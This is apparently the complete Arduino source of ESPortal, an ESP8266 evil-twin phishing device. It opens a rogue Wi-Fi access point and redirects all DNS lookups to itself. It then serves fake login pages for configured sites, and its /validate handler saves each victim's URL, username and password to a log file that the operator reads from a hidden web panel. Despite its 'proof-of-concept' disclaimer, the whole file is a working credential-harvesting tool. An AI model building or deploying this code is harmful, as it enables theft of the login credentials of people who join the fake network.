/*
 *ESPortal by Corey Harding 
 * www.legacysecuritygroup.com
 * Configure access point name and up to 3 custom domains and login urls in config.h
 * Configure the html for login page of said domains in site1.h, site2.h, and site3.h
 * Configure the html for any other domain(catch-all) in site_other.h
 * This is only a proof-of-concept.  I am not responsible for your actions.
 * Obey all local, state, federal, and international laws!
*/
#include "USERINTERFACE.h"
#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <ESP8266HTTPUpdateServer.h>
#include <DNSServer.h>
#include <ESP8266mDNS.h>
#include <FS.h>
#include "config.h"
#include "site1.h"
#include "site2.h"
#include "site3.h"
#include "site_other.h"
#include "sitecaptiveportal.h"
#include "portal_login.h"
void WiFiOff() {

    //Serial.println("diconnecting client and wifi");
    //client.disconnect();

WiFi.disconnect();
WiFi.mode(WIFI_OFF);

    
   

}
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);
ESP8266WebServer httpServer(1337);
ESP8266HTTPUpdateServer httpUpdater;

const char* update_path = "/update";

// Dish out Secret ESPortal Web Page
// located at anywebsite.com/esportal
void handle_portal() {
  webServer.send(200, "text/html", "<html><body>Code authors :<br><br>Corey Harding(www.LegacySecurityGroup.com)<br><a href="https://fb.com/abhinavm17/">@theenigma017</a><br>-----<br><a href=\"/esportal/log\">View /log.txt</a></html><br>-<br><a href=\"/esportal/wipe\">Wipe /log.txt</a><br>-<br><a href=\"/esportal/format\">Format File System</a><br>-<br><a href=\"/firmware\">Upgrade ESPortal Firmware</a></html>");
}
String webString="";
String serialString="";
// End of Dish

void setup() {
  //Start Serial
  Serial.begin(9600);
  Serial.println();
  Serial.println();
  Serial.println();

  //Create Access Point
  Serial.print("Creating Access Point...");
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(setSSID);
  Serial.println(" Success!");

  //Start DNS Server
  Serial.print("Starting DNS Server...");
  dnsServer.start(DNS_PORT, "*", apIP);
  Serial.println(" Success!");

  // Initialize file system and log file
  Serial.print("Initializing File System(First time can take around 90 seconds)...");
  SPIFFS.begin();
  Serial.println(" Success!");
  Serial.print("Checking for log.txt file...");
  // this opens the file "log.txt" in read-mode
  File f = SPIFFS.open("/log.txt", "r");
  
  if (!f) {
    Serial.print(" File doesn't exist yet. Creating it...");
    // open the file in write mode
    File f = SPIFFS.open("/log.txt", "w");
    if (!f) {
      Serial.println("File creation failed!");
    }
    f.println("File: /log.txt");
    f.println("Captured Login Credentials:");
  }
  f.close();
  Serial.println(" Success!");
  // End of file system block

  //check domain name and refresh page
  webServer.onNotFound([]() {
    webServer.send(200, "text/html", responseHTML);
  });

  //generic catch all login page for domains not listed in configuration
  webServer.on(SITEOTHER_redirect,[]() {
    webServer.send_P(200, "text/html", SITE_OTHER_HTML);
  });

  //SITE1 login page
  webServer.on(SITE1_redirect,[]() {
    webServer.send_P(200, "text/html", SITE1_HTML);
  });

  //SITE2 login page
  webServer.on(SITE2_redirect,[]() {
    webServer.send_P(200, "text/html", SITE2_HTML);
  });

  //SITE3 login page
  webServer.on(SITE3_redirect,[]() {
    webServer.send_P(200, "text/html", SITE3_HTML);
  });

    //Portal login page
  webServer.on(PORTALLOGIN_redirect,[]() {
    webServer.send(200, "text/html", PORTAL_LOGIN_HTML);
  });

  //Portal Page
  webServer.on("/esportal", handle_portal);

  //Validate-Save USER/PASS
  webServer.on("/validate", []() {
    String url = webServer.arg("url");
    String user = webServer.arg("user");
    String pass = webServer.arg("pass");
    File f = SPIFFS.open("/log.txt", "a");
    f.print(url);
    f.print(":");
    f.print(user);
    f.print(":");
    f.println(pass);
    f.close();
    
    serialString =user+":"+pass;
     webServer.send_P(200, "text/html", SITE3_HTML);
  
   
    Serial.println(serialString);
    serialString="";
    webString="";
   delay(6000);
  
   WiFiOff();
   

    delay(120000);
     
ESP.restart();

  });

  //Log Page
  webServer.on("/esportal/log", [](){
    webString="<html><body><a href=\"/esportal\"><- BACK TO INDEX</a><br><pre>";
    File f = SPIFFS.open("/log.txt", "r");
    serialString = f.readString();
    webString += serialString;
    f.close();
    webString += "</pre></body></html>";
    webServer.send(200, "text/html", webString);
    Serial.println(serialString);
    serialString="";
    webString="";
  });

  //Wipe Log Page
  webServer.on("/esportal/wipe", [](){
    webServer.send(200, "text/html", "<html><body>This will wipe all your captures from /log.txt file.<br><br>Are you sure?<br><br><a href=\"/esportal/wipe/yes\">YES</a> - <a href=\"/esportal\">NO</a></html>");
  });

  webServer.on("/esportal/wipe/yes", [](){
    webServer.send(200, "text/html", "Logs have been wiped.<br><br><a href=\"/esportal\"><- BACK TO INDEX</a>");
    File f = SPIFFS.open("/log.txt", "w");
    f.println("File: /log.txt");
    f.println("Captured Login Credentials:");
    f.close();
    Serial.println("Logs wiped");
  });

  //Format SPIFFS Page
  webServer.on("/esportal/format", [](){
    webServer.send(200, "text/html", "<html><body>This will reformat the SPIFFS File System.<br><br>Are you sure?<br><br><a href=\"/esportal/format/yes\">YES</a> - <a href=\"/esportal\">NO</a></html></html>");
  });

  webServer.on("/esportal/format/yes", [](){
    webServer.send(200, "text/html", "Formatting file system<br>This may take up to 90 seconds<br><br><a href=\"/esportal\"><- BACK TO INDEX</a>");
    Serial.print("Formatting file system...");
    SPIFFS.format();
    Serial.println(" Success");
  });

  webServer.on("/firmware", [](){
    webServer.send(200, "text/html", String()+"<html><body style=\"height: 100%;\"><a href=\"/esportal\"><- BACK TO INDEX</a><br><br>Open Arduino IDE.<br>Pull down Sketch Menu then select Export Compiled Binary.<br>Open Sketch Folder and upload the exported BIN file.<br>You may need to manually reboot the device to reconnect.<br><iframe style =\"border: 0; height: 100%;\" src=\"http://"+PORTALLOGIN+":1337/update\"><a href=\"http://"+PORTALLOGIN+":1337/update\">Click here to Upload Firmware</a></iframe></body></html>");
  });
  
  //Start Webserver
  Serial.print("Starting web server...");
  webServer.begin();
  httpUpdater.setup(&httpServer, update_path, update_username, update_password);
  httpServer.begin();

  MDNS.addService("http", "tcp", 1337);
  Serial.println(" Success!");
}

void loop() {
  //Check for DNS Request/Dish out Web Pages
  dnsServer.processNextRequest();
  webServer.handleClient();
  httpServer.handleClient();
}
